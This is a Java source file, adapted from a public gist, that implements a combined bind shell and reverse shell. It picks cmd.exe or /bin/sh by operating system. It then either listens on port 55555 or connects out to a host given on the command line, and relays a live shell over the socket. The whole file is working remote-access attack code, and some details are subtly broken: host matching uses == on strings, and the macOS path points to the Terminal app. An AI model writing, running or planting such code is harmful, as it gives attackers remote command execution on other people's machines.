import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;
import java.util.function.Predicate;

//Modified from reference:
//https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
public class Main {
    public static String[] LOCAL_HOSTNAMES = {"","0.0.0.0","127.0.0.1","localhost","::1"};
    public static final String DEFAULT_HOST = LOCAL_HOSTNAMES[0];
    public static final int DEFAULT_PORT = 55555;
    public static final long DEFAULT_THREAD_SLEEP_MILLS = 50l;
    public static final String CMD_SHELL_PATH = "C:\\Windows\\System32\\cmd.exe";
    public static final String SH_SHELL_PATH = "/bin/sh";
    public static final String TERMINAL_SHELL_PATH = "/Applications/Utilities/Terminal";
    public static String getShellPath(){
        String osName = (System.getProperty("os.name"));
        if(osName.toLowerCase().contains("Windows".toLowerCase()))
            return CMD_SHELL_PATH;
        if(osName.toLowerCase().contains("Mac OS".toLowerCase()))
            return TERMINAL_SHELL_PATH;
        return SH_SHELL_PATH;
    }
    public static boolean isHostLocal(String host){
        return Arrays.stream(LOCAL_HOSTNAMES).anyMatch(new Predicate<String>() {
            @Override
            public boolean test(String s) {
                return s == host;
            }
        });
    }
    public static void startRemoteShell(String host, int port, long sleepMills){
        boolean isLocalHost = isHostLocal(host);
        String shellPath = getShellPath();
        boolean isRunning = true;
        try {
            ServerSocket serverSocket = null;
            if (isLocalHost)
                serverSocket = new ServerSocket(port);
            Socket socket;
            while (isRunning) { // TODO? In-case I want to add command parsing...
                if (isLocalHost) {
                    //Bind Shell
                    socket = serverSocket.accept();
                } else {
                    //Reverse Shell
                    socket = new Socket(host, port);
                }
                Process shell = new ProcessBuilder(shellPath).redirectErrorStream(true).start();
                InputStream pi = shell.getInputStream(), pe = shell.getErrorStream(), si = socket.getInputStream();
                OutputStream po = shell.getOutputStream(), so = socket.getOutputStream();
                while(socket.isConnected()) {
                    while(pi.available() > 0)
                        so.write(pi.read());
                    while(pe.available() > 0)
                        so.write(pe.read());
                    while(si.available() > 0)
                        po.write(si.read());
                    so.flush();
                    po.flush();
                    try {
                        Thread.sleep(sleepMills);
                        shell.exitValue();
                        break;
                    } catch (IllegalThreadStateException | InterruptedException e) { /* NOP */ }
                }
                shell.destroy();
                socket.close();
            }
            if(serverSocket != null)
                serverSocket.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static void startRemoteShell(String host, int port){
        //Helper Function
        startRemoteShell(host, port, DEFAULT_THREAD_SLEEP_MILLS);
    }
    public static void startRemoteShell(int port){
        //Helper Function
        startRemoteShell(DEFAULT_HOST, port);
    }
    public static void startRemoteShell(){
        //Helper Function
        startRemoteShell(DEFAULT_PORT);
    }
    public static void main(String[] args) {
        String host = DEFAULT_HOST;
        int port = DEFAULT_PORT;
        if(args.length > 0)
            host = args[0];
        if(args.length > 1)
            port = Integer.parseInt(args[1]);
        startRemoteShell(host, port);
    }
}